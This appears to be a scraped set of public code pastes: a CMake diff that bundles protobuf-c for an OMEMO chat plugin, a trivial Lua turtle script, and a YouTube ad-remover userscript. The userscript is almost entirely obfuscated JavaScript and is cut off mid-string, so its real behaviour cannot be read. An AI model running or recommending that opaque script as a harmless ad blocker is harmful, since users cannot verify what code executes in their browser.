cxPndEkp,plugin bundled,KukuRuzo,CMake,Tuesday 30th of April 2024 06:15:58 PM CDT,"diff --git a/generic/omemoplugin/cmake/omemo_c.cmake b/generic/omemoplugin/cmake/omemo_c.cmake
index 19654d1..0aa9f32 100644
--- a/generic/omemoplugin/cmake/omemo_c.cmake
+++ b/generic/omemoplugin/cmake/omemo_c.cmake
@@ -1,13 +1,18 @@
 cmake_minimum_required(VERSION 3.10.0)
 
 set(OmemoCGitRepo ""https://github.com/psi-im/libomemo-c.git"")
+set(ProtobufCGitRepo ""https://github.com/protobuf-c/protobuf-c.git"")
 
 message(STATUS ""OMEMO_C: using bundled"")
 set(OMEMO_C_PREFIX ${CMAKE_CURRENT_BINARY_DIR}/omemo-c)
+set(PROTOBUF_C_PREFIX ${CMAKE_CURRENT_BINARY_DIR}/protobuf-c)
 set(OMEMO_C_BUILD_DIR ${OMEMO_C_PREFIX}/build)
+set(Protobuf_C_BUILD_DIR ${PROTOBUF_C_PREFIX}/build)
 set(OMEMO_C_INCLUDE_DIR ${OMEMO_C_PREFIX}/src/OmemoCProject/src)
-set(OMEMO_C_LIBRARY ${OMEMO_C_BUILD_DIR}/src/${CMAKE_STATIC_LIBRARY_PREFIX}omemo-c${D}${CMAKE_STATIC_LIBRARY_SUFFIX})
-set(Protobuf_C_LIBRARY ${OMEMO_C_BUILD_DIR}/src/protobuf-c/build/${CMAKE_STATIC_LIBRARY_PREFIX}protobuf-c${CMAKE_STATIC_LIBRARY_SUFFIX})
+set(OMEMO_C_LIBRARY ${OMEMO_C_BUILD_DIR}/${CMAKE_STATIC_LIBRARY_PREFIX}omemo-c${D}${CMAKE_STATIC_LIBRARY_SUFFIX})
+set(Protobuf_C_LIBRARY ${Protobuf_C_BUILD_DIR}/${CMAKE_STATIC_LIBRARY_PREFIX}protobuf-c${CMAKE_STATIC_LIBRARY_SUFFIX})
+set(Protobuf_C_INCLUDE_DIR ${PROTOBUF_C_PREFIX}/src/ProtobufCProject)
+set(PROTOBUF_C_SOURCE_DIR ${PROTOBUF_C_PREFIX}/src/ProtobufCProject/build-cmake)
 if(APPLE)
     set(COREFOUNDATION_LIBRARY ""-framework CoreFoundation"")
     set(COREFOUNDATION_LIBRARY_SECURITY ""-framework Security"")
@@ -17,7 +22,38 @@ endif()
 include(FindGit)
 find_package(Git REQUIRED)
 
+if(WIN32)
+    set(HIDE_FLAGS
+        -DCMAKE_IGNORE_PATH=""/usr/include/protobuf-c""
+        -DCMAKE_SYSTEM_IGNORE_PATH=""/usr/include/protobuf-c""
+    )
+endif()
+
+set(PROTOBUF_C_BUILD_OPTIONS
+    ${HIDE_FLAGS}
+    -DBUILD_SHARED_LIBS=OFF
+    -DCMAKE_POSITION_INDEPENDENT_CODE=ON
+    -DCMAKE_BUILD_TYPE=${CMAKE_BUILD_TYPE}
+    -DCMAKE_INSTALL_PREFIX=${OMEMO_C_BUILD_DIR} 
+    -DCMAKE_PREFIX_PATH=${CMAKE_PREFIX_PATH}
+    -DBUILD_PROTOC=OFF
+    -DGIT_EXECUTABLE=${GIT_EXECUTABLE}
+    -DCMAKE_TOOLCHAIN_FILE=${CMAKE_TOOLCHAIN_FILE}
+    -DCMAKE_MAKE_PROGRAM=${CMAKE_MAKE_PROGRAM} 
+    -DOSX_FRAMEWORK=OFF
+)
 include(ExternalProject)
+ExternalProject_Add(ProtobufCProject
+    PREFIX ${PROTOBUF_C_PREFIX}
+    BINARY_DIR ${Protobuf_C_BUILD_DIR}
+    GIT_REPOSITORY ""${ProtobufCGitRepo}""
+    CONFIGURE_COMMAND ${CMAKE_COMMAND} -G${CMAKE_GENERATOR} ${PROTOBUF_C_BUILD_OPTIONS} ${PROTOBUF_C_SOURCE_DIR} 
+    #CMAKE_ARGS ${PROTOBUF_C_BUILD_OPTIONS}
+    BUILD_BYPRODUCTS ${Protobuf_C_LIBRARY}
+    INSTALL_COMMAND """"
+    UPDATE_COMMAND """"
+)
+
 #set CMake options and transfer the environment to an external project
 set(OMEMO_C_BUILD_OPTIONS
     -DBUILD_SHARED_LIBS=OFF
@@ -25,8 +61,11 @@ set(OMEMO_C_BUILD_OPTIONS
     -DCMAKE_BUILD_TYPE=${CMAKE_BUILD_TYPE}
     -DCMAKE_INSTALL_PREFIX=${OMEMO_C_PREFIX}/build 
     -DCMAKE_PREFIX_PATH=${CMAKE_PREFIX_PATH}
-    -DBUNDLED_PROTOBUF_C=ON
-    -DGIT_EXEXUTABLE=${GIT_EXECUTABLE}
+    -DBUILD_WITH_PROTOBUF=static
+    -DProtobuf_C_LIBRARY:CACHE=${Protobuf_C_LIBRARY}
+    -DProtobuf_C_INCLUDE_DIR:CACHE=${Protobuf_C_INCLUDE_DIR}
+    -DCMAKE_ARCHIVE_OUTPUT_DIRECTORY=${OMEMO_C_BUILD_DIR}
+    -DGIT_EXECUTABLE=${GIT_EXECUTABLE}
     -DCMAKE_TOOLCHAIN_FILE=${CMAKE_TOOLCHAIN_FILE}
     -DCMAKE_MAKE_PROGRAM=${CMAKE_MAKE_PROGRAM} 
     -DOSX_FRAMEWORK=OFF
@@ -38,8 +77,8 @@ ExternalProject_Add(OmemoCProject
     GIT_REPOSITORY ""${OmemoCGitRepo}""
     GIT_TAG omemo
     CMAKE_ARGS ${OMEMO_C_BUILD_OPTIONS}
-    BUILD_BYPRODUCTS ${OMEMO_C_LIBRARY} ${Protobuf_C_LIBRARY}
+    BUILD_BYPRODUCTS ${OMEMO_C_LIBRARY}
     INSTALL_COMMAND """"
     UPDATE_COMMAND """"
-    DEPENDS ${DEPENDS}
+    DEPENDS ProtobufCProject
 )
"
UAFmkHmN,potato chef,nauseant,Lua,Tuesday 30th of April 2024 06:15:25 PM CDT,"function inventoryCheck()
    if peripheral.hasType(""top"", ""inventory"") then
            return true
    else
        print(""No storage above turtle :( Goodbye"")
        return false
    end
end

function main()
    print(""penits"")
    os.sleep(1)
end

while inventoryCheck() == true do
    main()
end"
80RmfH59,Youtube Ad Remover,ConcealedReal,JavaScript,Tuesday 30th of April 2024 06:14:21 PM CDT,"// ==UserScript==
// @name         Youtube Ad Remover
// @namespace    http://tampermonkey.net/
// @version      Beta
// @description  Remove Ads On Youtube
// @author       Splxff
// @match        https://*.youtube.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=youtube.com
// @grant        none
// @run-at       document-start
// ==/UserScript==
 
var a,b,c,d,e,g,h,i,j,k,l,o,q,r,w,x,y,z;function B(B){return a[B<360?B<360?B<-24?B+22:B<-24?B+47:B>360?B+52:B>-24?B>-24?B>360?B+78:B+23:B+37:B+70:B-52:B+42]}function C(e,a){return Object.defineProperty(e,B(-15),{value:a,configurable:B(49)}),e}a=V.call(this),b=C(X(((...e)=>{var r=X((B=>a[B<-75?B-67:B>309?B+16:B<309?B>309?B-59:B<-75?B+52:B<309?B<309?B+74:B+88:B+72:B+45]),1);if(e.length=2,e[B(-23)]=-B(-18),e[r(-74)]>B(45)){var c=X((B=>a[B<29?B-53:B>29?B-30:B+17]),1);return e[c(34)]}var t=X((B=>a[B<411?B>27?B>27?B>411?B+18:B<411?B>411?B-72:B<411?B-28:B+49:B-41:B-14:B+40:B-47]),1);return e[B(-21)](e[t(29)]())}),0),B(-20))(S,U);var I,J,D=[],E=B(-22),F=X(((...e)=>{var r=X((B=>a[B<-3?B+2:B>-3?B>-3?B<-3?B+29:B<381?B<-3?B-25:B<-3?B+29:B+2:B-23:B+93:B+70]),1);return e.length=r(-1),e[r(4)]=e[B(-22)],e.ahpuWsU=[T(r(-1)),T(B(-21)),T(r(1)),T(r(17)),T(B(33)),T(B(74)),""nde0u]|?Q8d04b+Y0%^y#_(;C2KDV.qZ<A"",T(6),T(B(122)),T(B(13)),T(B(10)),T(B(11)),T(r(37)),T(r(12)),T(B(19)),T(14),T(r(49)),T(16),T(17),T(r(13)),T(B(2)),T(20),""|D8=]^mC"",T(B(4)),T(B(3)),T(r(76)),T(B(-3)),T(25),T(r(100)),T(B(87)),T(B(-5)),T(r(123)),T(r(22)),T(31),T(B(46)),T(B(220)),T(r(27)),T(r(35)),T(36),T(37),T(B(38)),T(B(18)),T(B(34)),T(r(145)),T(r(303)),T(r(58)),T(44),T(r(305)),T(B(40)),T(r(36)),T(r(150)),T(49),T(r(198)),""<+VK|fMC"",T(51),T(52),T(r(75)),T(54),T(55),T(B(17)),T(B(65)),T(B(290)),T(r(147)),T(B(30)),T(r(91)),T(r(110)),T(B(-10)),T(r(85)),T(65),T(r(97)),T(r(155)),T(68),T(r(312)),T(B(162)),T(71),T(B(116)),T(r(142)),T(74),T(B(146)),T(B(312)),T(B(57)),T(r(210)),T(B(41)),T(B(20)),T(r(47)),T(r(101)),T(B(226)),T(B(42)),T(B(86)),T(B(68)),T(r(272)),T(88),T(B(165)),T(B(51)),T(r(344)),T(r(253)),T(B(324)),T(94),T(B(258)),T(r(2)),T(r(151)),T(B(238)),T(r(300)),T(r(114)),T(B(253)),T(B(327)),T(B(61)),T(B(101)),T(B(115)),T(r(173)),T(r(265)),T(B(-18)),T(109),T(r(205)),T(B(72)),T(r(263)),T(r(234)),T(r(226)),T(r(351)),T(116),T(r(57)),T(B(39)),T(r(28)),T(B(100)),T(B(187)),""0z|/W>kC"",T(B(335)),T(123),T(B(336)),T(B(23)),T(126),T(r(10)),T(128),T(r(160)),T(r(228)),T(r(359)),T(B(157)),T(133),T(B(339)),T(B(167)),T(B(81)),T(B(-2)),T(138),T(r(115)),T(r(349)),T(r(363)),T(B(297)),T(r(336)),T(r(364)),T(145),T(146),T(147),T(148),T(B(347)),T(B(105)),T(r(369)),T(r(116))],e[B(-16)]=e[B(-17)],E?e[r(5)].pop():E++,e[r(5)]}),0)();function G(){try{return global||window||new Function(T(B(117)))()}catch(B){try{return this}catch(B){return{}}}}function H(...r){var c=X((B=>a[B>-21?B>363?B+93:B+20:B-9]),1);if(r[B(-15)]=B(-21),r[218]=c(1),typeof d!==T(B(-1))&&d){var t=X((B=>a[B<-30?B-45:B+29]),1);return(new d)[T(c(171))](new e(r[r[t(-6)]-137]))}if(typeof g!==T(c(2))&&g){var R=X((B=>a[B>481?B-77:B<481?B<481?B-98:B+12:B+72]),1);return g[T(c(136))](r[c(-19)])[T(r[R(121)]+c(4))](T(168))}var n=X((B=>a[B<454?B<70?B+90:B<454?B-71:B-81:B+42]),1);return j(r[n(72)])}c=G()||{},d=c[T(B(350))],e=c[T(155)],g=c[T(B(352))],h=c[T(B(275))]||String,i=c[T(158)]||Array,j=X((()=>{var e,r,c;function t(B){return a[B>-37?B<-37?B-90:B>-37?B<-37?B+89:B+36:B-35:B-18]}return e=new i(t(160)),r=h[T(t(134))]||h[T(B(256))],c=[],C(X(((...R)=>{var n,s,i;function u(B){return a[B<329?B+54:B-77]}for(R[u(-46)]=1,R[u(-45)]=R.xYInmnl,R[u(-38)]=91,R[u(-45)]=R[B(-22)][T(u(-44))],R[B(-12)]=R[0],c[T(u(-44))]=u(-53),n=0;n<R[u(-45)];){if((i=R[u(-43)][n++])<=u(-42))s=i;else if(i<=223){var o=X((B=>a[B<337?B<-47?B-60:B>337?B+11:B>-47?B>-47?B+46:B+40:B+15:B+24]),1);s=(i&u(104))<<B(-6)|R[o(-35)][n++]&u(-41)}else if(i<=239){var w=X((B=>a[B>298?B+69:B>298?B+93:B>-86?B>298?B+75:B>-86?B+85:B-46:B+14]),1);s=(15&i)<<w(-71)|(R[w(-74)][n++]&u(-41))<<6|R[w(-74)][n++]&u(-41)}else if(h[T(159)]){var f=X((B=>a[B>397?B+69:B>13?B>397?B+43:B<13?B-26:B>397?B-64:B>13?B-14:B+74:B+100]),1);s=(7&i)<<u(-39)|(R[f(25)][n++]&u(-41))<<f(28)|(R[u(-43)][n++]&R[f(30)]-(R[f(30)]-63))<<u(-37)|R[B(-12)][n++]&R.im6ex6S-B(-5)}else s=u(-41),n+=B(-4);c[T(R.im6ex6S+u(127))](e[s]||=r(s))}return R[B(-7)]>t(218)?R[u(-34)]:c[T(163)]("""")}),0),t(-34))}),0)(),C(H,B(-21)),k=R[T(B(8))](void 0,21),l=R(B(2)),o=R[T(B(5))](B(9),[B(3)]),q={[T(171)]:R(B(4)),[T(172)]:R[T(B(5))](void 0,[19]),[T(B(185))]:R(B(6)),[T(B(303))]:R(72),[T(175)]:R(B(7))},r=[R(B(24)),R(B(21))],w=X(((...e)=>{var r;function c(B){return a[B>411?B-14:B-28]}return e[c(36)]=c(29),e[c(63)]=e.lOLme8,r=R[T(B(8))](B(9),11),e[B(-21)]=[R(B(10)),R[T(c(59))](B(9),B(11))],e[218]=e[B(-21)],e[c(63)]={toq203:[],JfM31z:R[T(c(59))](B(9),c(64)),FiIyMs7:B(164),D2Q0z4:e[c(51)][0],lUnzWgm:c(65),l4EupK:c(66),wY2jWU:e[218][B(-21)],xyIkK8:X(((B=void 0)=>{void 0===B&&(B=R(c(67)));var e=X((B=>a[B<94?B+89:B<478?B-95:B+94]),1);if(!w.toq203[e(96)]){var r=X((B=>a[B>-62?B>-62?B<-62?B-91:B<-62?B+77:B>322?B+74:B<-62?B-10:B>-62?B>322?B-88:B+61:B+68:B+95:B+7]),1);w.toq203.push(-r(-21))}return w.toq203[B]}),0),ejqc4X:B(18),mKSyOT:B(44),ino3tXN:R(c(42)),ttvK9Ri:R[T(B(5))](c(60),[c(70)]),uZMUpB:R(B(96)),VZSsX9:[],YPY9ez:X(((B=void 0)=>(void 0===B&&(B=r),w.VZSsX9[0]||w.VZSsX9.push(4),w.VZSsX9[B])),0),ByWrJH:80},e[c(73)]=B(20),e[55]>200?e[-c(72)]:e[e[B(22)]+c(74)]}),0)();var K=function(...e){var r,c;function t(B){return a[B<52?B+38:B>436?B+48:B<436?B<52?B+34:B<436?B>436?B-16:B-53:B-31:B+98]}if(e[t(61)]=B(-22),e[t(101)]=t(100),e[t(54)]={[T(e[t(101)]-(e[B(25)]-t(108)))]:R(t(100))},e[t(107)]=R(17),r=function(...e){var r=X((B=>a[B<331?B<331?B<-53?B-38:B>-53?B>-53?B<331?B<-53?B+21:B<331?B+52:B+33:B-48:B+2:B-2:B+97:B+21]),1);e.length=B(-22),e[r(-2)]=r(-3),e[e[t(103)]-r(-3)]=[R(e[B(27)]-65)],e.b4clNc={[T(B(29))]:R(B(28))};try{return window||global||new Function(e.b4clNc[T(r(0))]+e[r(-51)][0])()}catch(B){return c[R(t(100))](this)}},c=function(){try{return this}catch(B){return X((B=>a[B>-64?B<320?B>320?B+61:B<-64?B+15:B<-64?B+58:B>320?B+76:B<-64?B+97:B+63:B+94:B+98]),1)(8)}},e[t(101)]>117)return e[-B(30)];var n=X((B=>a[B>466?B+75:B>82?B<466?B>82?B>466?B+62:B-83:B+96:B+16:B-98]),1);return J=c[e[n(137)]](this,P),I=r[e[e[n(131)]-17][T(B(32))]](this)}[r[B(-22)]]();function L(...e){var r=X((B=>a[B>-90?B<294?B<-90?B+78:B<294?B>-90?B+89:B+44:B+4:B-60:B+99]),1);switch(e[r(-81)]=2,e[B(35)]=118,x){case w.ejqc4X>-r(-33)?B(34):B(28):return e[r(-88)]+e[e[B(35)]-r(-30)];case-B(37):return e[r(-88)]/e[r(-87)];case w.ejqc4X>-4?-B(38):null:return e[e[B(35)]-r(-27)]-e[r(-87)];case-B(40):return e[e[r(-31)]-(e.kVTjy5-B(-22))]*e[B(-21)];case w.mKSyOT>-86?r(-36):e[r(-31)]+B(41):return!e[e[r(-31)]-r(-27)]}}function N(...e){var r=X((B=>a[B>-42?B<-42?B-57:B>342?B-18:B<-42?B-58:B>342?B+73:B<-42?B-41:B+41:B-9]),1);return e[r(-33)]=B(-21),e[B(43)]=B(42),e[B(43)]>211?e[e[r(25)]-r(26)]:(e[B(-22)]=x+(x=e[e[B(43)]-r(24)],r(-40)),e[r(-40)])}function O(e,a,r){var c,t,n=R[T(B(8))](B(9),B(38));return c={[n]:C(X(((...e)=>{e[B(-15)]=3,e.M6ad5rb=B(20);var[[],a]=z;e.M6ad5rb=-B(2),document[R(B(124))+R(B(282))+B(180)](R(B(37))+R(B(283))+R(B(284)))?.[R(e[B(286)]+B(125))+R(B(15))+R(48)]>B(-22)&&(e[B(285)]=R(B(282)),document[R(41)+R(B(282))+B(180)](R(B(246)))[R(B(177))+R[T(B(5))](void 0,[B(164)])]=document[R(B(124))+e[B(285)]+""r""](R(49))[R(B(127))+B(332)],document[R(B(124))+R[T(B(8))](B(9),B(282))+B(180)](R(B(54))+R(B(225))+R[T(170)](B(9),[B(22)])+R(B(17))+R[T(B(5))](B(9),[B(65)])+R(B(22))+B(66))?.[R(e[B(286)]+77)]()),e[124]=e[e[B(286)]+B(2)]}),0),B(-4)),[R[T(B(8))](B(9),37)]:C((function(...e){if(e[B(-15)]=B(-4),e[B(287)]=-B(11),e[B(-4)]=[R[T(B(8))](B(9),B(64))],e[B(2)]=e[217]+B(28),L(e[B(-22)],N(60)))return e[B(-21)](this,e[e[B(287)]+B(-9)]);var[[],a]=z;a[B(153)]&&(a[B(67)]=a[B(104)](a.e),a[B(90)](),L(a[B(75)],x=B(30))&&(a[B(97)]=document[R(B(124))+R[T(170)](B(9),[B(282)])+B(180)](R(B(126))))&&(a[B(97)][R(58)](),(a[B(82)]=P(886)[R(B(30))+R(B(70))+""le""])?L(a[B(98)][R[T(B(5))](B(9),[18])][R[T(B(8))](B(9),B(89))](B(288))[R[T(B(5))](void 0,[B(-10)])+""es""](a.j[R(B(64))+R(e[B(287)]+B(146))]),x=B(30))?(e[B(289)]=(a.m(a.j[R(B(64))+R(B(125))]),a.h=B(49),a[B(98)][R(B(-8))]?a[B(98)][R(e[B(287)]+28)][R(B(89))](B(288)):[]),e[B(289)][R(B(76))](a.j[e[B(-4)][B(-22)]+R(B(125))]),a[B(98)][R(B(-8))]=e[B(289)][R(e[B(2)]+B(89))](B(288)),a.i[R(58)]()):a[B(75)]=B(49):a.i[R(B(290))]()))}),3)},a==R(B(219))&&(z=[]),t=a==R(B(291))?y[e]||=function(...a){var r,t,n,T,s;for(r=B(-2),t=305,n=-417,T=62,s={[B(97)]:-194,[B(75)]:B(24),w:31,[B(56)]:418,[B(83)]:416,[B(257)]:R(B(162)),[B(182)]:932,[B(143)]:B(33),[B(176)]:B(134),[B(237)]:X(((e=void 0)=>(void 0===e&&(e=r==B(-16)),e?(r+=t-B(292),s.l=B(50)):r)),0),[B(138)]:152,[B(91)]:-B(158),[B(67)]:R(B(158)),[B(218)]:B(184),[B(113)]:B(293),[B(148)]:X((()=>n+=B(30)),0),H:B(294),f:-B(70),ae:()=>t+=B(40),[B(160)]:X((()=>(r+=B(87),s[B(234)](),s.W(),T-=B(290))),0),[B(114)]:198,[B(85)]:B(-6),[B(179)]:B(17),as:()=>(t-=B(129),T+=B(184)),[B(63)]:B(238),[B(234)]:X((()=>t+=s[R(B(3))+R(B(55))+B(142)](""m"")?-46:s[B(150)]),0),[B(92)]:B(30),[B(178)]:367,[B(180)]:B(-20),[B(295)]:X((()=>T-=B(164)),0),[B(69)]:629,[B(141)]:B(226),[B(156)]:65,[B(249)]:385,[B(119)]:B(265),[B(183)]:B(55),[B(235)]:()=>n==B(115),[B(301)]:()=>(t-=48,T-=74),g:-B(4),[B(104)]:B(34),[B(131)]:B(308),[B(82)]:-B(251),[B(66)]:B(81),[B(136)]:X((()=>n=36),0),[B(280)]:X((()=>n+=B(42)),0),[B(223)]:931,[B(163)]:X((()=>(t-=B(129),T-=B(15))),0),[B(302)]:C(X(((...e)=>(e[B(-15)]=B(-21),e[B(296)]=e[B(-22)],e[B(296)][B(140)]?-831:B(244))),0),B(-21)),[B(170)]:C(X(((...e)=>(e[B(-15)]=B(-21),e[B(232)]=B(244),e[B(232)]>190?e[-B(-3)]:e[B(-22)].L?140:-961)),0),1)};r+t+n+T!=B(297);)switch(r+t+n+T){case s[B(98)]?725:B(124):if(s[B(298)]=""av"",B(50)){s[B(299)]();break}s.a=i,r+=B(279),s[B(71)]=B(49);break;case 384:case B(219):return z=s.am=a,c[n==B(44)?P(-B(307)):e].call(this,(s[B(85)]==B(89)?P(B(252)):s)[B(257)]);default:case B(269):case B(300):case 314:s[B(136)](),r+=s[B(91)]==B(162)?-B(-5):B(87),t-=B(40),n*=2,n+=585,T-=B(290);break;case 190:if(B(50)){t-=48,T-=B(44);break}n=B(86),s[B(301)]();break;case 871:case 883:case B(290):case 80:n=49,s[B(304)]();break;case 77!=T&&26!=T&&136!=T&&T+B(225):case 703:case 900:case 795:n=36,s[B(163)]();break;case 884:case 131:n=-B(108),s[B(295)]();break;case s[B(302)](s):r*=2,r-=242;break;case 87:var i=B(50);t+=r-183,s.k=!1;break;case 85:if(-477==n&&B(50)){s[B(160)]();break}n=B(86),r+=r-B(184),t-=B(40),n+=t-B(319),T-=B(290);break;case-417!=n&&n+504:if(s[B(235)]()){r+=B(87),t*=B(-20),t-=351,s.ad();break}n=B(86),r+=B(87),t-=B(40),n+=B(42);break;case s[B(170)](s):if(136==t){r-=B(220),s[B(140)]=!1;break}if(s[B(153)]){s[B(237)]();break}r-=72}}:c[e](R(B(68))),r==R(87)?{OJ55qN:t}:t}function P(...e){switch(e[B(-15)]=1,e[B(322)]=e[2],e.FUxxsO={[T(191)]:R(B(94)),[T(192)]:R(B(145))},e.HyL9cHs=R(B(165)),e[B(321)]=B(9),e[B(320)]=83,e[e[B(320)]-83]){case 462:return I[R(e[B(320)]+B(74))]||J[R(B(111))];case 306:e[B(321)]=R(e[B(320)]+B(-6))||J[e[B(322)]];break;case B(252):e[B(321)]=R(B(51))||J[R(B(51))];break;case B(187):e[B(321)]=R(B(323))||J[R(B(323))];break;case-513:return I[R(B(232))]||J[R(B(232))];case B(273):e[B(321)]=R(B(324))||J[R(B(324))];break;case B(262):return I[R(94)+R(95)]||J[R(B(247))+R(B(258))];case 678:e.f2fk8ic=R(B(-19))+R(B(130))||J[R[T(B(8))](void 0,B(-19))+R(97)];break;case B(325):return I[R(98)+R(B(279))]||J[R(e[B(320)]+B(28))+R(B(279))];case-303:e[B(321)]=R(100)||J[R(B(93))];break;case-B(326):e[B(321)]=R[T(169)](void 0,B(253))||J[R(B(327))+R(B(61))+R(104)+""me""];break;case-150:return I[R(B(115))+R(106)+R(B(244))]||J[R(B(115))+R(106)+R[T(B(5))](B(9),[B(244)])];case e[B(320)]+B(-20):return I[R(B(-18))+R(B(268))]||J[R[T(B(5))](B(9),[B(184)])];case 473:return I[R(B(72))]||J[R(B(72))];case B(316):return I[R(112)]||J[R[T(169)](B(9),B(242))];case-B(328):return I[R(B(213))+R[T(e[B(320)]+B(251))](void 0,[B(205)])+B(329)]||J[R(B(213))+R(114)+B(329)];case 257:e[B(321)]=R(B(330))||J[R(B(330))];break;case B(331):e[B(321)]=R(B(333))+B(332)||J[R(B(333))+B(332)];break;case 33:e[B(321)]=R(B(36))||J[R(B(39))+q[T(175)]];break;case B(334):e.f2fk8ic=R(e[B(320)]+37)+R(121)||J[R(e[B(320)]+B(108))+R(B(187))];break;case-33:return I[R(B(335))]||J[R(122)];case-B(224):return I[R(123)]||J[R(e[B(320)]+B(34))];case-B(64):e.f2fk8ic=R(B(336))+R(B(23))+R(B(181))||J[R(124)+R(e[B(320)]+B(282))+R(e[B(320)]+B(37))];break;case-B(337):return I[R(B(-11))]||J[R(e.kFoCvNm+B(283))];case-B(243):e[B(321)]=R(B(173))+R(B(139))||J[R(B(173))+R[T(B(8))](B(9),B(139))];break;case-29:return I[R[T(B(5))](B(9),[B(207)])]||J[R(130)];case B(267):return I[R(B(338))]||J[R(B(338))];case 338:e.f2fk8ic=R(B(157))||J[R[T(B(8))](B(9),133)+R(B(339))+B(140)];break;case-(e[B(320)]+813):e[B(321)]=R[T(B(8))](B(9),B(167))+R[T(B(5))](B(9),[136])||J[R(135)+R[T(B(5))](B(9),[B(81)])];break;case B(340):return I[R[T(B(8))](B(9),137)]||J[R(B(-2))];case-586:return I[R(138)]||J[R[T(e[B(320)]+B(251))](B(9),[B(186)])];case-B(311):return I[e.FUxxsO[T(B(341))]]||J[R(B(94))];case 409:return I[R(B(328))]||J[R(e[B(320)]+B(65))];case-765:return I[R(B(342))+B(332)]||J[R(e[B(320)]+B(290))+B(332)];case 2505:e[B(321)]=R(B(297))||J[R(B(315))+B(345)];break;case 2947:return I[R(e[B(320)]+B(70))+B(344)]||J[R(B(343))+B(344)];case 2595:e[B(321)]=R(145)+B(345)||J[R(B(206))+B(345)];break;case 3366:return I[e.FUxxsO[T(192)]]||J[R(B(145))];case 2632:return I[R[T(B(8))](B(9),B(346))+R[T(B(8))](B(9),B(139))]||J[R(B(346))+R(B(139))];case 1822:e[B(321)]=R(B(281))+R(149)||J[R[T(B(5))](B(9),[148])+R[T(B(5))](void 0,[B(347)])];break;case 4750:return I[R(B(105))+R[T(B(8))](void 0,B(348))]||J[R(B(105))+R(B(348))];case 2480:e.f2fk8ic=R(B(21))+R(152)+B(349)||J[r[B(-21)]+R[T(B(5))](B(9),[e[B(320)]-(e[B(320)]-152)])+B(349)];break;case e.kFoCvNm+1451:e[B(321)]=R(B(117))||J[R(B(117))];break;case 3153:return I[R(B(350))+B(349)]||J[R(154)+B(349)];case 1819:e[B(321)]=R(B(351))||J[R(B(351))];break;case 3862:return I[R(B(352))]||J[R(B(352))]}return e.kFoCvNm>B(353)?e[-B(10)]:I[e.f2fk8ic]||J[e[B(321)]]}function Q(...e){e[B(-15)]=1,e[B(348)]=-B(265),e[B(-21)]='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~""',e.r2Pd_v=""""+(e[0]||""""),e[B(354)]=e.r2Pd_v,e[B(-4)]=e[B(354)].length,e.zdFAPjN=[],e[B(74)]=B(-22),e[B(357)]=0,e[B(355)]=-B(-21);for(let a=B(-22);a<e[B(-4)];a++)if(e.C2NoGy=e[e[e[B(348)]+B(32)]+26].indexOf(e[B(354)][a]),e[B(356)]!==-B(-21))if(e[B(355)]<B(-22))e[B(355)]=e[B(356)];else{e[B(355)]+=e[B(356)]*B(323),e[5]|=e.xSUfrz6<<e[B(357)],e[B(357)]+=(8191&e.xSUfrz6)>B(111)?B(19):B(96);do{e[B(358)].push(e[e[B(348)]+(e[151]-(e[B(348)]-B(1)))]&e[151]+280),e[B(74)]>>=8,e[B(357)]-=B(13)}while(e[B(357)]>B(122));e[B(355)]=-B(-21)}return e.xSUfrz6>-B(-21)&&e.zdFAPjN.push(255&(e[5]|e[B(355)]<<e[B(357)])),e[151]>B(162)?e[B(23)]:H(e[B(358)])}function R(B,e,a,r=void 0,c=void 0){return void 0===r&&(r=Q),void 0===c&&(c=D),a?e[D[a]]=R(B,e):(e&&([c,e]=[r(c),B||a]),e?B[c[e]]:D[B]||(c[B],a=r,D[B]=a(F[B])))}function S(){return'.Ls:^*aeR5^dRwEmKS/2^m~RDT`#LOAR7!>,rlA|R,+fO<>Md!Z|(2pGI?Rd6!40gbcXt,}xY|e%[zvl)SYRe?*x1pSPo2xz{MŒ&xEP^izUD|J#s3B1ĦWopz]*BpHKBzyNGSg)6d3uVvX6;:YD[boG<dM^OCj2rVB|V,1Ekjo0&8o@MbDZh2idJk7dB5308PHYNaC|P28dw_~Ơh5[IPąǄ>Ē0^ĊTG|XPU=>[ǃ|nzjg1nŹ|^z;=H?[ƠyDw2H:2SE|dP(gt@mǄ44!fP[Ħ]ǶJb|ȊNKd|2X01CuyǄȘȚnvoǄPP)FȖvz.Jf,uǄ;)71q9ǣW,HhK(JŻơ5gJm4qMǛjrIJ|S8ǟ=[${lT|Q5zg=<3dF|a}&Ii@?ƠȠǩv{Y<!t/Ơ=G>fŸȞɣ852bȰǄɐɒ[cǄ[nOxȯSǄuJȁ3+BƠPǈKu#6ǄOSl:=5W@ǽ22q=F1xƠVaz=g/5Ơd8_1l`;Ơ?in<ɓȤ|k!YJcƣ;HR|y21a^[3ˋˍ9lKʡ+I+;ˍȘˇ5+vƠǝLg6=ɻ`qe3@Ȍ|4Ćff>ĦʖG3ȯȅ|x5*fe,ĦQ8ɜɓʆ|˘˪M:qǄLGdK][˃,˙˛UǄ6oˑ˓̑|=i,<v;Ħ:ȏUriG/%9/,alL&lH<ˉ[/ɢɬ8=̝|*l8f5=ʍ|ZuDgǲĦxo(I1]͍Ȋ1KoȣǄr5ʸ˱Ħc8Ȕa|hrZɿ|HgDd;m!Ǆj8Iz8?ʳǽ>cWH]kM+ǽRo^gU<Ə#F}uhQjLWP9K>>]{;%TzqxΗ;nȭ;WR1,$ztGyŴ͕2fK|wɛg7=YǄ0/;ǄΊΌΎƏǛ3LzIx)2!Ǜo,=Cs@SkH|lƘI,WBdǛTuȁ<WưϜ0aǟȕĦ~Oɜu)űw&̴k^͵mO˻i>ȱ}!`+nuWiIEh+Ɏϲϴ)iǄb:ύP:˃TB]1Ϙ˃XBt<r@$Ħ^Dȁ+W˸|.ligW`(Ơ[7S=8nfpūβɸɺυȧ=l/Ħ͊bgňar%2L:7;Ǜ8DVKͪ;iʸ[˲nrȔr2ͅё̼ˉĦ[iĒsГǄnX̧c̤imfƬ=Ơ̺ˀ͙ɻяǟЁueǛȎǟʀAIk$?#axHl3oSzw)w҅|҇=ʀДŬoĪv)ɻgѐ2hƭǄǿrgg,ϫҡң)έϊҕҗҙқePњǹkǄcr̕ȖҼҾ:Қ2$,ɴ|Cƿ<86&YϜY2~zɘ}Ouп@ͅ7ɅfҪȱ|ј@Ɏ=7ʄ̋%Dǟˉ+MM%ІƠӯӱ,˥|ŌĒѵEE0=ȯʬ|ɋύȖ_qȭ̄]@Ǜɚɜξπ|toX<ˣͅѢT˩˫Ǆe5Ēňѳǧ/wӦprFιgzɜh`ĦȫьN:8қ̥ѸƬɨ